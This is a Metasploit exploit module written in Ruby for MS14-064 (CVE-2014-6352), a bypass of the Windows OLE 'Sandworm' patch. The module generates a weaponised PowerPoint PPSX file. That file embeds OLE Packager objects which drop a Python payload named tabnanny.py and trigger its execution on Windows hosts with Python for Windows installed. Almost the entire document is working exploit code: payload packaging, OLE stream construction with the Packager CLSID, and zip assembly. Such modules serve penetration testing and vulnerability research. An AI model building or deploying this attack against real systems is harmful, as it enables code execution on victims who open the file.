# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::FILEFORMAT
include Msf::Exploit::EXE
def initialize(info={})
super(update_info(info,
&#039;Name&#039; => "MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python",
&#039;Description&#039; => %q{
This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE)
allowing arbitrary code execution, bypassing the patch MS14-060, for the vulnerability
publicly known as "Sandworm", on systems with Python for Windows installed. Windows Vista
SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be vulnerable.
However, based on our testing, the most reliable setup is on Windows platforms running
Office 2013 and Office 2010 SP2. Please keep in mind that some other setups such as
those using Office 2010 SP1 may be less stable, and may end up with a crash due to a
failure in the CPackage::CreateTempFileName function.
},
&#039;License&#039; => MSF_LICENSE,
&#039;Author&#039; =>
[
&#039;Haifei Li&#039;, # Vulnerability discovery and exploit technique
&#039;sinn3r&#039;, # Metasploit module
&#039;juan vazquez&#039; # Metasploit module
],
&#039;References&#039; =>
[
[&#039;CVE&#039;, &#039;2014-6352&#039;],
[&#039;MSB&#039;, &#039;MS14-064&#039;],
[&#039;BID&#039;, &#039;70690&#039;],
[&#039;URL&#039;, &#039;http://blogs.mcafee.com/mcafee-labs/bypassing-microsofts-patch-for-the-sandworm-zero-day-even-editing-can-cause-harm&#039;]
],
&#039;Platform&#039; => &#039;python&#039;,
&#039;Arch&#039; => ARCH_PYTHON,
&#039;Targets&#039; =>
[
[&#039;Windows 7 SP1 with Python for Windows / Office 2010 SP2 / Office 2013&#039;, {}],
],
&#039;Privileged&#039; => false,
&#039;DefaultOptions&#039; =>
{
},
&#039;DisclosureDate&#039; => "Nov 12 2014",
&#039;DefaultTarget&#039; => 0))
register_options(
[
OptString.new(&#039;FILENAME&#039;, [true, &#039;The PPSX file&#039;, &#039;msf.ppsx&#039;])
], self.class)
end
def exploit
print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
payload_packager = create_packager(&#039;tabnanny.py&#039;, payload.encoded)
trigger_packager = create_packager("#{rand_text_alpha(4)}.py", rand_text_alpha(4 + rand(10)))
zip = zip_ppsx(payload_packager, trigger_packager)
file_create(zip)
end
def zip_ppsx(ole_payload, ole_trigger)
zip_data = {}
data_dir = File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2014-4114&#039;, &#039;template&#039;)
Dir["#{data_dir}/**/**"].each do |file|
unless File.directory?(file)
zip_data[file.sub(data_dir,&#039;&#039;)] = File.read(file)
end
end
# add the otherwise skipped "hidden" file
file = "#{data_dir}/_rels/.rels"
zip_data[file.sub(data_dir,&#039;&#039;)] = File.read(file)
# put our own OLE streams
zip_data[&#039;/ppt/embeddings/oleObject1.bin&#039;] = ole_payload
zip_data[&#039;/ppt/embeddings/oleObject2.bin&#039;] = ole_trigger
# create the ppsx
ppsx = Rex::Zip::Archive.new
zip_data.each_pair do |k,v|
ppsx.add_file(k,v)
end
ppsx.pack
end
def create_packager(file_name, contents)
file_info = [2].pack(&#039;v&#039;)
file_info << "#{file_name}\x00"
file_info << "#{file_name}\x00"
file_info << "\x00\x00"
extract_info = [3].pack(&#039;v&#039;)
extract_info << [file_name.length + 1].pack(&#039;V&#039;)
extract_info << "#{file_name}\x00"
file = [contents.length].pack(&#039;V&#039;)
file << contents
append_info = [file_name.length].pack(&#039;V&#039;)
append_info << Rex::Text.to_unicode(file_name)
append_info << [file_name.length].pack(&#039;V&#039;)
append_info << Rex::Text.to_unicode(file_name)
append_info << [file_name.length].pack(&#039;V&#039;)
append_info << Rex::Text.to_unicode(file_name)
ole_data = file_info + extract_info + file + append_info
ole_contents = [ole_data.length].pack(&#039;V&#039;) + ole_data
ole = create_ole("\x01OLE10Native", ole_contents)
ole
end
def create_ole(stream_name, data)
ole_tmp = Rex::Quickfile.new(&#039;ole&#039;)
stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)
stm = stg.create_stream(stream_name)
stm << data
stm.close
directory = stg.instance_variable_get(:@directory)
directory.each_entry do |entry|
if entry.instance_variable_get(:@_ab) == &#039;Root Entry&#039;
# 0003000C-0000-0000-c000-000000000046 # Packager
clsid = Rex::OLE::CLSID.new("\x0c\x00\x03\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46")
entry.instance_variable_set(:@_clsId, clsid)
end
end
# write to disk
stg.close
ole_contents = File.read(ole_tmp.path)
ole_tmp.close
ole_tmp.unlink
ole_contents
end
end

